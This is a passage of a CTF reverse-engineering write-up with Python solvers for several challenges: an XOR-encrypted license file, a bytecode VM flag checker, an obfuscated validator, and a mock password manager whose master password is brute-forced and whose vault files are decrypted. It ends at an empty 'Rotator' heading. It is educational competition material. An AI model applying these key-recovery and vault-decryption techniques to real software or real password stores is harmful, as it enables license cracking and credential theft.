          encrypt_flag(local_98,local_b8,__ptr,sVar3);
          __s = fopen("license.key","wb");
          if (__s == (FILE *)0x0) {
            puts("Gagal membuat license.key.");
            free(__ptr);
            uVar2 = 1;
          }
          else {
            fwrite(__ptr,1,sVar3,__s);
            fclose(__s);
            free(__ptr);
            puts("Serial valid. license.key berhasil dibuat!");
            uVar2 = 0;
          }
        }
      }
      else {
        puts("Serial key salah.");
        uVar2 = 1;
      }
    }
    else {
      puts("Serial key harus 8 digit angka.");
      uVar2 = 1;
    }
  }
  else {
    puts("Input error.");
    uVar2 = 1;
  }
LAB_001017f2:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar2;
}
```

Decompiled shows `main` that take input, check the length, then did some **custom hash** on serial and compared with **64‑bit hard‑coded constant**. If same, execute continue with writing of `license.key` that encrypt internal plaintext using **repeated XOR (8‑byte key repeated)**. This pattern detect from loop that XOR every byte plaintext with byte to‑`i mod 8` from value of 64‑bit hash/constant value.

From **ciphertext** (`license.key`) produced from that key, decryption can be done with repeated XOR using **same keystream**. When keystream known, decryption : `plaintext = ciphertext XOR keystream`. Because keystream repeated per 8 byte, implementation of loop of size 8 also makes it easier.

The step is get **64‑bit constant** from biner (reverse result/Ghidra), convert to **8 byte little‑endian**, repeat every length of ciphertext, then **XOR** with `license.key` to get the flag. This Solver is the implementation :

```python
from pathlib import Path

KEY64 = 0x5ad4f40b2b0a4f09
KEY_BYTES = KEY64.to_bytes(8, 'little')

ct = Path('license.key').read_bytes()

pt = bytes(c ^ KEY_BYTES[i % 8] for i, c in enumerate(ct))

print(pt.decode())
```

#### Flag
NCLPS1{i1'mM_s0rRy_m4ke_y0u_fe3lba4d_bBut_c0Ngr4ts_047d9db348}

### License Activation

#### Description
Utilitas baris-perintah untuk memverifikasi kunci lisensi secara offline. Masukkan kunci dengan format NCLPS1{...} Jika valid, aplikasi menampilkan Activation successful. Jika tidak, akan menampilkan Activation failed.

#### Solution
```python
def _rol8(x, r):
    r &= 7
    x &= 0xFF
    return ((x << r) | (x >> (8 - r))) & 0xFF

class _VM:
    def __init__(self, bytecode, user_input):
        self.bc = bytearray(bytecode)
        self.ip = 0
        self.st = []
        self.s  = [ord(c) & 0xFF for c in user_input]

    def run(self):
        ip = self.ip
        bc = self.bc
        st = self.st
        s  = self.s
        while True:
            op = bc[ip]; ip += 1
            if op == 0x00:
                pass
            elif op == 0x01:
                st.append(bc[ip]); ip += 1
            elif op == 0x02:
                idx = bc[ip]; ip += 1
                st.append(s[idx] if 0 <= idx < len(s) else 0)
            elif op == 0x03:
                b = st.pop(); a = st.pop(); st.append((a ^ b) & 0xFF)
            elif op == 0x04:
                b = st.pop(); a = st.pop(); st.append((a + b) & 0xFF)
            elif op == 0x05:
                r = bc[ip]; ip += 1
                a = st.pop(); st.append(_rol8(a, r))
            elif op == 0x06:
                b = st.pop(); a = st.pop(); st.append(1 if a == b else 0)
            elif op == 0x07:
                b = st.pop(); a = st.pop(); st.append(1 if (a and b) else 0)
            elif op == 0x08:
                return bool(st.pop() if st else 0)
            elif op == 0x09:
                b = st.pop(); a = st.pop(); st.append((a - b) & 0xFF)
            elif op == 0x0A:
                m = bc[ip]; ip += 1
                a = st.pop(); st.append(a % m if m else 0)
            elif op == 0x0B:
                a = st[-1]; st.append(a)
            elif op == 0x0C:
                if st: st.pop()
            else:
                return False
```

From the source code, it actually not running any verification on the string, but load a binary bytecode block that saved as Base85 the XOR with a constant (228). After decode, found a VM that executed, PUSH_CONST, PUSH_INPUT, XOR, ADD, ROL, MOD, EQ, AND, RET for each of char position that being inputted. There is a 72 check per-char that each of it manipulate aritmethic/bitwise in the `s[i]` then compare with constant, every result `AND`-ed to determine all of validity.

Here is the solver that I implemented. This code decode Base85, XOR key, parse instructions flow, then finish it with checking each of character by trying every byte value (0..255).

```python
import base64

B85 = "..."
KEY = 228

raw = base64.b85decode(B85.encode('ascii'))
bc  = bytes((b ^ KEY) & 0xFF for b in raw)

# 0x01 = PUSH_CONST <imm>
# 0x02 = PUSH_INPUT <idx>
# 0x03 = XOR
# 0x04 = ADD
# 0x05 = ROL <imm>
# 0x06 = EQ
# 0x07 = AND
# 0x08 = RET
# 0x09 = SUB
# 0x0A = MOD <imm>
# 0x0B = DUP
# 0x0C = POP

def solve_seq(seq):
    sols=[]
    for x in range(256):
        st=[x]
        ip=0
        try:
            while ip < len(seq):
                op, imm = seq[ip]; ip+=1
                if op==0x01: st.append(imm)
                elif op==0x02: st.append(0)
                elif op==0x03:
                    b = st.pop(); a = st.pop(); st.append((a ^ b) & 0xFF)
                elif op==0x04:
                    b = st.pop(); a = st.pop(); st.append((a + b) & 0xFF)
                elif op==0x05:
                    r = imm & 7; a = st.pop(); st.append(((a << r) | (a >> (8-r))) & 0xFF)
                elif op==0x06:
                    b = st.pop(); a = st.pop(); st.append(1 if a==b else 0)
                elif op==0x07:
                    b = st.pop(); a = st.pop(); st.append(1 if (a and b) else 0)
                elif op==0x09:
                    b = st.pop(); a = st.pop(); st.append((a - b) & 0xFF)
                elif op==0x0A:
                    m = imm; a = st.pop(); st.append(a % m if m else 0)
                elif op==0x0B:
                    st.append(st[-1])
                elif op==0x0C:
                    if st: st.pop()
                else:
                    raise RuntimeError(f"unknown op {op}")
        except IndexError:
            continue
        if st and st[-1]==1:
            sols.append(x)
    if len(sols)!=1:
        raise RuntimeError(f"solusi tidak unik/ada untuk seq: {sols}")
    return sols[0]

flag = [0]*72
ip = 0
found = 0
while ip < len(bc) and found < 72:
    op = bc[ip]; ip+=1
    if op==0x02:
        idx = bc[ip]; ip+=1
        seq = []
        while True:
            o = bc[ip]; ip+=1
            if o in (0x01, 0x02, 0x05, 0x0A):
                imm = bc[ip]; ip+=1
                seq.append((o, imm))
            else:
                seq.append((o, None))
            if o==0x06:
                break
        flag[idx] = solve_seq(seq)
        found += 1
    elif op==0x08:
        break
    else:
        pass

print(bytes(flag).decode())
```

#### Flag
NCLPS1{he1i_KamU_ter1m4k4siH_y4_uD4h_akt1v4si_l1SeNnns1_k4m1_b4c7599f3b}

### Obfs

#### Description
Legend says the author loved to hide secrets in plain sight, and enjoyed making puzzles only the most persistent could solve.

Can you uncover the secret message the author left behind?

#### Solution
```c
  pcVar2 = fgets(local_58,0x43,stdin);
  if (pcVar2 == (char *)0x0) {
    uVar3 = 1;
  }
  else {
    sVar4 = strlen(local_58);
    local_14c = (int)sVar4;
    if (local_58[local_14c + -1] == '\n') {
      local_14c = local_14c + -1;
      local_58[local_14c] = '\0';
    }
    if (local_14c == 0x41) {
      extra_junk();
      confuse(local_58,local_148);
      mangle(local_148,local_f8,tbl);
      local_a8 = 0x8db24059b85ec812;
      local_a0 = 0x664e8b290badeb88;
      local_98 = 0x9933f38ed421953b;
      local_90 = 0xc0c2e92d7fe48d6;
      local_88 = 0xb312f02c7a917f07;
      local_80 = 0xa0da6bff02ecb1f2;
      local_78 = 0x29c45c7e4b1deb48;
      local_70 = 0x5f4f21a6aa5d4936;
      local_68 = 0x88;
      decoy_func(local_f8);
      iVar1 = validate(local_f8,&local_a8);
```

Decompiled shows after input, main will read till 67 byte (fgets(buf,0x43,stdin)), cut \n and check length = 0x41 (65). If length not valid, then abort. If length valid, then run extra_junk() (noise), confuse(input, tmp1), mangle(tmp1, tmp2, tbl), set expected constants (8×64-bit + 1 byte), call decoy_func(tmp2), then validate(tmp2, expected) that doing per-byte equality for 65 byte. If same → "Nice! Flag accepted."

```c
  for (local_c = 0; (int)local_c < 0x41; local_c = local_c + 1) {
    bVar3 = xor_key[(int)local_c] ^ *(byte *)(param_1 + (int)local_c);
    cVar1 = (char)local_c;
    if ((local_c & 1) == 0) {
      local_d = (byte)((int)(uint)bVar3 >> (7U - (cVar1 + (char)((int)local_c / 5) * -5) & 0x1f)) |
                bVar3 << (cVar1 + (char)((int)local_c / 5) * -5 + 1U & 0x1f);
    }
    else {
      bVar2 = (byte)((int)local_c >> 0x1f);
      local_d = bVar3 << (7 - ((cVar1 + (bVar2 >> 6) & 3) - (bVar2 >> 6)) & 0x1f) |
                (byte)((int)(uint)bVar3 >> (((cVar1 + (bVar2 >> 6) & 3) - (bVar2 >> 6)) + 1 & 0x1f ))
      ;
    }
    *(byte *)((int)local_c + param_2) = local_d;
```

confuse do b = xor_key[i] ^ in[i], then if i even: out[i] = rol(b, (i % 5) + 1); else out[i] = ror(b, (i & 3) + 1).

```c
void mangle(long param_1,long param_2,long param_3)

{
  undefined4 local_c;
  
  for (local_c = 0; local_c < 0x41; local_c = local_c + 1) {
    *(byte *)(param_2 + local_c) =
         *(byte *)(param_3 + (local_c * 7) % 0x41) ^ *(byte *)(param_1 + local_c);
  }
  return;
}
```

mangle do out[i] = tbl[(i * 7) % 65] ^ in[i].

```c
undefined8 validate(long param_1,long param_2)

{
  int local_c;
  
  local_c = 0;
  while( true ) {
    if (0x40 < local_c) {
      return 1;
    }
    if (*(char *)(param_1 + local_c) != *(char *)(param_2 + local_c)) break;
    local_c = local_c + 1;
  }
  return 0;
}
```

validate do for i in 0..64 if out[i] != expected[i] return false.

![alt text](/images/nclp/obfs/image-1.png)
![alt text](/images/nclp/obfs/image.png)

From the decompiled we can know the address of xor_key is 0x102080, tbl is 0x102020, and target constant arranged in stack by main.

![alt text](/images/nclp/obfs/image-2.png)

With GDB, we can get actual target bytes that used in the runtime. Set breakpoint in the `validate` then `x/65bx $rsi` to get `expected`

This solver invert mangle (XOR dengan tbl[(i*7)%65]), invert rotate (rotr/rol according index parity), then XOR with xor_key to get real byte.

```python
from typing import List

def rol8(b: int, r: int) -> int:
    r %= 8
    return ((b << r) & 0xff) | ((b & 0xff) >> (8 - r))

def ror8(b: int, r: int) -> int:
    r %= 8
    return ((b & 0xff) >> r) | ((b << (8 - r)) & 0xff)

tbl = bytes([
  0x3a,0x5c,0x2d,0xa9,0x17,0x3e,0x9d,0x1b,0x48,0x0f,0x72,0x1a,0x36,0xe0,0xc5,0x7f,
  0x23,0x42,0x94,0x3b,0xf0,0x5a,0xb1,0xd8,0x15,0x81,0x2e,0x6d,0x77,0x6e,0xe7,0x55,
  0x34,0xc4,0x4b,0x60,0xab,0x20,0x98,0x7e,0x1d,0xf7,0x2b,0x51,0xcd,0x99,0x0c,0xbe,
  0x9f,0xaf,0x65,0x08,0x04,0x5e,0x16,0x84,0x38,0x1e,0x72,0xa1,0x3b,0x44,0x56,0x29,
  0x97
])

xor_key = bytes([
  0x5a,0x0c,0x3f,0x7e,0x22,0xb1,0x1d,0x4f,0x38,0x6e,0xa4,0xe7,0x2c,0xf1,0x0b,0xdc,
  0x55,0x6a,0x37,0xb9,0x19,0x99,0xab,0x8e,0x10,0x21,0xcb,0x14,0x8f,0xad,0xcd,0xea,
  0x42,0x3d,0x59,0x9c,0xbf,0xf3,0x81,0x50,0x73,0x47,0x99,0x34,0x62,0xd1,0x7c,0x16,
  0x44,0xc9,0x28,0xa8,0x79,0x1e,0xb7,0x12,0xff,0x2c,0x84,0x11,0x97,0x33,0x67,0x42,0xaa
])

expected = bytes([
  0x12,0xc8,0x5e,0xb8,0x59,0x40,0xb2,0x8d,0x88,0xeb,0xad,0x0b,0x29,0x8b,0x4e,0x66,
  0x3b,0x95,0x21,0xd4,0x8e,0xf3,0x33,0x99,0xd6,0x48,0xfe,0xd7,0x92,0x2e,0x0c,0x0c,
  0x07,0x7f,0x91,0x7a,0x2c,0xf0,0x12,0xb3,0xf2,0xb1,0xec,0x02,0xff,0x6b,0xda,0xa0,
  0x48,0xeb,0x1d,0x4b,0x7e,0x5c,0xc4,0x29,0x36,0x49,0x5d,0xaa,0xa6,0x21,0x4f,0x5f,
  0x88
])

def invert_transform(expected: bytes, tbl: bytes, xor_key: bytes) -> bytes:
    assert len(expected) == 65
    assert len(tbl) == 65
    assert len(xor_key) == 65
    out = bytearray(65)
    for i in range(65):
        idx = (i * 7) % 65
        confused = expected[i] ^ tbl[idx]
        if (i & 1) == 0:
            shift = (i % 5) + 1
            b = ror8(confused, shift)
        else:
            shift = (i & 3) + 1
            b = rol8(confused, shift)
        plain = b ^ xor_key[i]
        out[i] = plain & 0xff
    return bytes(out)

flag = invert_transform(expected, tbl, xor_key)
try:
    print(flag.decode('utf-8', errors='replace'))
except Exception as e:
    print("Could not decode cleanly:", e)
```

#### Flag
NCLPS1{m3em4ng_k4dang_oBbfusc4t1on_m3nyer4mkan_ma4f_y_c395c67777}

### Password Manager v2

#### Deskripsi
VaultBox adalah aplikasi password manager Windows untuk menyimpan kredensial. Aplikasi berjalan offline, mendukung perubahan lokasi vault folder, dan menyediakan generator password.

TL;DR
Setel Master Password saat membuka aplikasi.
Item disimpan satu-file-per-entry di folder vault (.nclp).
Format file memiliki header + ciphertext + HMAC.
Urutan proteksi data: PBKDF2 → AES-256-CBC → Rotator (bit-rotate) → XOR keystream → HMAC.
Master dapat dipulihkan secara lokal (tidak butuh jaringan).

Hint
Magic bytes: NCLP
Kunci diturunkan dengan PBKDF2 bawaan .NET Framework (Rfc2898DeriveBytes) default = HMAC-SHA1.
Rounds yang ditulis di header bisa “lebih besar” daripada yang dipakai; implementasi melakukan clamp ke nilai tertentu untuk performa (perhatikan kode).
Verifikasi HMAC-SHA256 atas header||ciphertext.
XOR keystream: blok 32-byte dari HMAC-SHA256(K_xor, counter_le).
Gate UI melakukan XOR(0x5A) → SHA-256 → Base64 (di-obfuscate) untuk validasi.
Increment PCG32 hanya tersimpan 40-bit bawah; 24-bit atas disembunyikan → brute-force ruang 2^24.

#### Solution
Decompile with ILSpy, shows that program parse file header `NclpHeader`, read/write file `NclpFile`, derive key `Kdf.DeriveKeys`, XOR keystream `XorKeystream.Apply`,  rotator `Rotator`, AES wrapper `AesCipher`, and validate gate `MasterGate`.

```csharp
// vaultbox, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// VaultBox.WinForms.Storage.NclpHeader
using System.IO;
using VaultBox.WinForms.Storage;

public class NclpHeader
{
	public static readonly byte[] Magic = new byte[4] { 78, 67, 76, 80 };

	public byte Version { get; set; } = 1;

	public byte[] Salt { get; set; } = new byte[16];

	public byte[] IV { get; set; } = new byte[16];

	public int KdfRoundsDeclared { get; set; } = 500000;

	public byte RotationSeed { get; set; } = 55;

	public byte[] SerializeMeta()
	{
		using MemoryStream memoryStream = new MemoryStream();
		using BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write(Magic);
		binaryWriter.Write(Version);
		binaryWriter.Write((byte)Salt.Length);
		binaryWriter.Write((byte)IV.Length);
		binaryWriter.Write(Salt);
		binaryWriter.Write(IV);
		binaryWriter.Write(KdfRoundsDeclared);
		binaryWriter.Write(RotationSeed);
		return memoryStream.ToArray();
	}

	public static NclpHeader Parse(BinaryReader br)
	{
		byte[] array = br.ReadBytes(4);
		if (array.Length != 4 || array[0] != Magic[0] || array[1] != Magic[1] || array[2] != Magic[2] || array[3] != Magic[3])
		{
			throw new InvalidDataException("Invalid magic");
		}
		NclpHeader obj = new NclpHeader
		{
			Version = br.ReadByte()
		};
		byte count = br.ReadByte();
		byte count2 = br.ReadByte();
		obj.Salt = br.ReadBytes(count);
		obj.IV = br.ReadBytes(count2);
		obj.KdfRoundsDeclared = br.ReadInt32();
		obj.RotationSeed = br.ReadByte();
		return obj;
	}
}
```

Header `.nclp` starts with magic `b"NCLP"` then variable field: version (1 byte), salt length (1), iv length (1), salt (saltLen), iv (ivLen), `KdfRoundsDeclared` (Int32 LE), and `RotationSeed` (1). `SerializeMeta()` create this line; `Parse()` reread it.

```csharp
// vaultbox, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// VaultBox.WinForms.Crypto.Kdf
using System.Security.Cryptography;

public static class Kdf
{
	private const int ClampRounds = 100000;

	public static void DeriveKeys(string master, byte[] salt, int roundsDeclared, out byte[] kMain, out byte[] kMac, out byte[] kXor)
	{
		int num = roundsDeclared;
		if (num > 100000)
		{
			num = 100000;
		}
		using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(master, salt, num))
		{
			kMain = rfc2898DeriveBytes.GetBytes(32);
		}
		using (Rfc2898DeriveBytes rfc2898DeriveBytes2 = new Rfc2898DeriveBytes(master, salt, num / 2))
		{
			kMac = rfc2898DeriveBytes2.GetBytes(32);
		}
		using Rfc2898DeriveBytes rfc2898DeriveBytes3 = new Rfc2898DeriveBytes(master, salt, num / 4);
		kXor = rfc2898DeriveBytes3.GetBytes(32);
	}
}
```

KDF implement three PBKDF2‑HMAC‑SHA1 deriviation: `kMain = PBKDF2(master, salt, rounds')` (32 B), `kMac = PBKDF2(master, salt, rounds'/2)` (32 B), `kXor = PBKDF2(master, salt, rounds'/4)` (32 B) with `rounds' = min(declared, 100000)`.

The protection order that taken from `NclpFile.Write` and `NclpFile.Read` is:

```
Plaintext -> gzip -> AES-256-CBC/PKCS7 (kMain, IV) -> per-byte LEFT rotate (seed + index) % 8 -> XOR keystream (HMAC-SHA256(kXor, LE32 counter)) -> write header || cipher || HMAC-SHA256(kMac, header||cipher)
```

```csharp
// vaultbox, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// VaultBox.WinForms.Crypto.XorKeystream
using System;
using System.Security.Cryptography;

public static class XorKeystream
{
	public static byte[] Apply(byte[] input, byte[] kXor)
	{
		byte[] array = new byte[input.Length];
		int num = 0;
		int num2 = 0;
		using HMACSHA256 hMACSHA = new HMACSHA256(kXor);
		while (num2 < input.Length)
		{
			byte[] bytes = BitConverter.GetBytes(num);
			byte[] array2 = hMACSHA.ComputeHash(bytes);
			int num3 = Math.Min(array2.Length, input.Length - num2);
			for (int i = 0; i < num3; i++)
			{
				array[num2 + i] = (byte)(input[num2 + i] ^ array2[i]);
			}
			num2 += num3;
			num++;
		}
		return array;
	}
}
```

XOR keystream created by `HMACSHA256(kXor)` towards counter 32‑bit little-endian that starts from 0; every HMAC block give 32 byte keystream that which then cut if it the last data.

```csharp
// vaultbox, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// VaultBox.WinForms.Crypto.Rotator
public static class Rotator
{
	public static byte[] Rotate(byte[] input, byte seed)
	{
		byte[] array = new byte[input.Length];
		for (int i = 0; i < input.Length; i++)
		{
			int num = ((seed + i) & 0xFF) % 8;
			byte b = input[i];
			array[i] = (byte)((b << num) | (b >> 8 - num));
		}
		return array;
	}

	public static byte[] Unrotate(byte[] input, byte seed)
	{
		byte[] array = new byte[input.Length];
		for (int i = 0; i < input.Length; i++)
		{
			int num = ((seed + i) & 0xFF) % 8;
			byte b = input[i];
			array[i] = (byte)((b >> num) | (b << 8 - num));
		}
		return array;
	}
}
```

Rotator rotate bit every byte: `r = ((seed + i) & 0xFF) % 8` then `out[i] = (in[i] << r) | (in[i] >> (8-r))`.

```csharp
// vaultbox, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// VaultBox.WinForms.Crypto.AesCipher
using System.IO;
using System.Security.Cryptography;

public static class AesCipher
{
	public static byte[] Encrypt(byte[] plaintext, byte[] key, byte[] iv)
	{
		using Aes aes = Aes.Create();
		aes.KeySize = 256;
		aes.BlockSize = 128;
		aes.Mode = CipherMode.CBC;
		aes.Padding = PaddingMode.PKCS7;
		aes.Key = key;
		aes.IV = iv;
		using MemoryStream memoryStream = new MemoryStream();
		using CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
		cryptoStream.Write(plaintext, 0, plaintext.Length);
		cryptoStream.FlushFinalBlock();
		return memoryStream.ToArray();
	}

	public static byte[] Decrypt(byte[] ciphertext, byte[] key, byte[] iv)
	{
		using Aes aes = Aes.Create();
		aes.KeySize = 256;
		aes.BlockSize = 128;
		aes.Mode = CipherMode.CBC;
		aes.Padding = PaddingMode.PKCS7;
		aes.Key = key;
		aes.IV = iv;
		using MemoryStream memoryStream = new MemoryStream();
		using CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write);
		cryptoStream.Write(ciphertext, 0, ciphertext.Length);
		cryptoStream.FlushFinalBlock();
		return memoryStream.ToArray();
	}
}
```

AES that being used is `KeySize=256, Mode=CBC, Padding=PKCS7`.

```csharp
// vaultbox, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// VaultBox.WinForms.Core.Security.MasterGate
using System;
using System.Security.Cryptography;
using System.Text;

public static class MasterGate
{
	private static readonly string ObfuscatedRef = "=cEv0idwwkv0idXoCv0idmKav0idWGTv0idEa+v0id/rlv0idNsDv0idrQev0id9Oav0idsFZv0id8bXv0idMtkv0idB3wv0ides";

	private const byte GateKey = 90;

	private const ulong SeedObf = 6602474991779635733uL;

	private const ulong SeedMask = 11936128518282651045uL;

	private const ulong IncLower40 = 848745626173uL;

	private static readonly string RecoveryBlobB64 = "GU651+ldtMsYHW9JoL7KNAravLfQJg==";

	public static bool Validate(string input)
	{
		try
		{
			string a = Reverse(Deinterleave(ObfuscatedRef, "v0id"));
			string b = Sha256Base64(XorUtf8(input, 90));
			return SlowEquals(a, b);
		}
		catch
		{
			return false;
		}
	}

	public static string TryRecoverWithTop24(uint top24)
	{
		ulong seed = DeobfuscateSeed();
		ulong inc = ((ulong)(top24 & 0xFFFFFF) << 40) | 0xC59D2E7A3DL;
		byte[] array = Convert.FromBase64String(RecoveryBlobB64);
		byte[] array2 = PcgKeystream(seed, inc, array.Length);
		byte[] array3 = new byte[array.Length];
		for (int i = 0; i < array.Length; i++)
		{
			array3[i] = (byte)(array[i] ^ array2[i]);
		}
		return Encoding.UTF8.GetString(array3);
	}

	private static byte[] PcgKeystream(ulong seed, ulong inc, int nbytes)
	{
		ulong state = 0uL;
		ulong mul = 6364136223846793005uL;
		ulong incval = (inc << 1) | 1;
		Step();
		state += seed;
		Step();
		byte[] array = new byte[nbytes];
		int num = 0;
		while (num < nbytes)
		{
			ulong num2 = state;
			Step();
			uint num3 = (uint)(((num2 >> 18) ^ num2) >> 27);
			uint num4 = (uint)(num2 >> 59);
			uint num5 = (num3 >> (int)num4) | (num3 << (int)((0L - (long)num4) & 0x1F));
			if (num < nbytes)
			{
				array[num++] = (byte)(num5 & 0xFF);
			}
			if (num < nbytes)
			{
				array[num++] = (byte)((num5 >> 8) & 0xFF);
			}
			if (num < nbytes)
			{
				array[num++] = (byte)((num5 >> 16) & 0xFF);
			}
			if (num < nbytes)
			{
				array[num++] = (byte)((num5 >> 24) & 0xFF);
			}
		}
		return array;
		void Step()
		{
			state = state * mul + incval;
		}
	}

	private static ulong DeobfuscateSeed()
	{
		return 10309554068971027553uL;
	}

	public static string GenerateReferenceHash(string master)
	{
		return Interleave(Reverse(Sha256Base64(XorUtf8(master, 90))), "v0id");
	}

	private static byte[] XorUtf8(string s, byte key)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(s);
		for (int i = 0; i < bytes.Length; i++)
		{
			bytes[i] ^= key;
		}
		return bytes;
	}

	private static string Sha256Base64(byte[] data)
	{
		using SHA256 sHA = SHA256.Create();
		return Convert.ToBase64String(sHA.ComputeHash(data));
	}

	private static string Reverse(string s)
	{
		char[] array = s.ToCharArray();
		Array.Reverse(array);
		return new string(array);
	}

	private static string Interleave(string s, string salt)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < s.Length; i++)
		{
			stringBuilder.Append(s[i]);
			if (i % 3 == 2)
			{
				stringBuilder.Append(salt);
			}
		}
		return stringBuilder.ToString();
	}

	private static string Deinterleave(string s, string salt)
	{
		return s.Replace(salt, string.Empty);
	}

	private static bool SlowEquals(string a, string b)
	{
		if (a == null || b == null || a.Length != b.Length)
		{
			return false;
		}
		int num = 0;
		for (int i = 0; i < a.Length; i++)
		{
			num |= a[i] ^ b[i];
		}
		return num == 0;
	}
}
```

MasterGate calculate `candidate_hash = Base64(SHA256(XOR_UTF8(master, 0x5A)))` and compare it with constant that has been obfuscated. There is also secret function `TryRecoverWithTop24(uint)` that using PCG32 to decrypt `RecoveryBlobB64` with increment that combine top 24‑bit. Because lower 40 bit increment is still, we only 24‑bit need of bf.

After master discovered, `.nclp` can be done with: lower three PBKDF2 key (according clamp), verification `HMAC-SHA256(kMac, header||cipher)` byte‑per‑byte, then reverse sort: XOR‑keystream -> unrotate -> AES‑CBC decrypt -> gunzip.

First, brute‑force recovery with this script that stops when master discovered and verified with gate function that identical with the application:

```python
import base64, hashlib

# Konstanta dari MasterGate
SEED = 10309554068971027553 # DeobfuscateSeed()
INC_LOWER40 = 0x00C59D2E7A3D # IncLower40 (40-bit bawah)
BLOB_B64 = "GU651+ldtMsYHW9JoL7KNAravLfQJg=="
GATE_KEY = 0x5A
REF_HASH = "sew3BktMXb8ZFsaO9eQrDsNlr/+aETGWaKmCoXkwwEc=" # (target gate-hash)

def gate_hash(s: str) -> str:
    b = s.encode("utf-8")
    b = bytes([x ^ GATE_KEY for x in b]) # XOR(0x5A)
    return base64.b64encode(hashlib.sha256(b).digest()).decode()

def pcg_keystream(seed: int, inc: int, nbytes: int) -> bytes:
    state = 0
    mul = 6364136223846793005
    incval = (inc << 1) | 1
    def step():
        nonlocal state
        state = (state * mul + incval) & ((1 << 64) - 1)
    step()
    state = (state + seed) & ((1 << 64) - 1)
    step()
    out = bytearray(nbytes); i = 0
    while i < nbytes:
        s = state; step()
        xorshifted = ((s >> 18) ^ s) >> 27
        rot = (s >> 59) & 0xFFFFFFFF
        r = ((xorshifted >> rot) | ((xorshifted << ((-rot) & 31)) & 0xFFFFFFFF)) & 0xFFFFFFFF
        for shift in (0, 8, 16, 24):
            if i < nbytes:
                out[i] = (r >> shift) & 0xFF
                i += 1
    return bytes(out)

def try_recover_with_top24(top24: int) -> str:
    inc = ((top24 & 0xFFFFFF) << 40) | INC_LOWER40
    blob = base64.b64decode(BLOB_B64)
    ks = pcg_keystream(SEED, inc, len(blob))
    plain = bytes(a ^ b for a, b in zip(blob, ks))
    return plain.decode("utf-8", errors="ignore")

def main():
    for t in range(1 << 24):
        cand = try_recover_with_top24(t)
        if gate_hash(cand) == REF_HASH:
            print(f"Found top24=0x{t:06X}  master='{cand}'")
            print(f"Verify gate={gate_hash(cand)}")
            return
        if (t & 0xFFFF) == 0:
            print(f"\rscan 0x{t:06X}")
    print("\n[!] not found")

if __name__ == "__main__":
    main()
```

Master discovered on `0x370000` and the value is `master='orbit_fluorescent#2025'`.

After it, the next decryption step is: input `MASTER` & `VAULT_DIR` at the top of the script, then run. Script will read every `.nclp`, parsing header, verificating HMAC, rotate the transformation, then gunzip decompress and recovering plaintext. For the implementation is this solver script:

```python
MASTER = "orbit_fluorescent#2025"
VAULT_DIR = "vaultbox/vault"

import glob, io, os, struct, gzip, hashlib, hmac, sys
from Crypto.Cipher import AES

# same helpers
def _pbkdf2(master: str, salt: bytes, rounds_declared: int):
    eff = min(rounds_declared, 100_000)
    m = master.encode("utf-8")
    kMain = hashlib.pbkdf2_hmac("sha1", m, salt, max(eff, 1), dklen=32)
    kMac  = hashlib.pbkdf2_hmac("sha1", m, salt, max(eff // 2, 1), dklen=32)
    kXor  = hashlib.pbkdf2_hmac("sha1", m, salt, max(eff // 4, 1), dklen=32)
    return kMain, kMac, kXor

def _xor_keystream(data: bytes, kxor: bytes) -> bytes:
    out = bytearray(len(data)); pos = 0; ctr = 0
    while pos < len(data):
        ctr_le = struct.pack("<I", ctr)
        ks = hmac.new(kxor, ctr_le, hashlib.sha256).digest()
        n = min(32, len(data) - pos)
        for i in range(n):
            out[pos + i] = data[pos + i] ^ ks[i]
        pos += n; ctr += 1
    return bytes(out)

def _unrotate(buf: bytes, seed: int) -> bytes:
    out = bytearray(len(buf))
    for i, b in enumerate(buf):
        r = ((seed + i) & 0xFF) % 8
        out[i] = ((b >> r) | ((b << (8 - r)) & 0xFF)) & 0xFF
    return bytes(out)

def _pkcs7_unpad(b: bytes) -> bytes:
    if not b: raise ValueError("empty")
    n = b[-1]
    if n < 1 or n > 16 or b[-n:] != bytes([n])*n: raise ValueError("bad PKCS7")
    return b[:-n]

def _parse_header(f: io.BytesIO):
    if f.read(4) != b"NCLP":
        raise ValueError("bad magic")
    version = f.read(1)[0]
    salt_len = f.read(1)[0]
    iv_len   = f.read(1)[0]
    salt = f.read(salt_len)
    iv   = f.read(iv_len)
    rounds_declared = struct.unpack("<i", f.read(4))[0]
    rotation_seed   = f.read(1)[0]
    meta_len = f.tell()
    return version, salt, iv, rounds_declared, rotation_seed, meta_len

def decrypt(path: str, master: str) -> str:
    data = open(path, "rb").read()
    f = io.BytesIO(data)
    ver, salt, iv, rounds, rot, meta_len = _parse_header(f)

    if len(data) < meta_len + 32:
        raise ValueError("truncated")
    tag = data[-32:]
    ct  = data[meta_len:-32]

    kMain, kMac, kXor = _pbkdf2(master, salt, rounds)

    want = hmac.new(kMac, data[:meta_len] + ct, hashlib.sha256).digest()
    if not hmac.compare_digest(tag, want):
        raise ValueError("HMAC mismatch")

    x = _xor_keystream(ct, kXor)
    x = _unrotate(x, rot)
    pt = AES.new(kMain, AES.MODE_CBC, iv).decrypt(x)
    pt = _pkcs7_unpad(pt)
    
    return gzip.decompress(pt).decode("utf-8", "replace")

def main():
    files = sorted(glob.glob(os.path.join(VAULT_DIR, "*.nclp")))
    
    for p in files:
        print(f"===== FILE: {os.path.basename(p)} =====")
        try:
            s = decrypt(p, MASTER)
            print(s, end="" if s.endswith("\n") else "\n")
        except Exception as e:
            print(f"[ERROR] {e}")
        print()

if __name__ == "__main__":
    main()
```

#### Flag
NCLPS1{PBKDF2_&&_pCg32_40_b1t_1ncR3m3Nt_t0p24_h1d3_r3COv3r3d_thEn_VauLt_decrYpt3d_a21d1d6a82}

### Rotator

#### Description
